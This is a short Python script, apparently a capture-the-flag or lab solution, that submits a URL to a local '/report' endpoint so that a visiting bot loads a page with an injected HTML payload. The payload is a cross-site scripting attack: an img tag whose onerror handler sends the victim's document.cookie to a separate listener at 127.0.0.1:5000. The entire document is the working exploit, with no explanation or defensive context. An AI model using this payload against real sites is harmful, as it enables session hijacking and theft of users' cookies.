import requests

data = {
    "url":"""/?html=
    <img src=%23 onerror="
        location.href = 'http://127.0.0.1:5000/?'%2bdocument.cookie;
    ">
    """
}
response = requests.post("http://127.0.0.1:30030/report", data=data)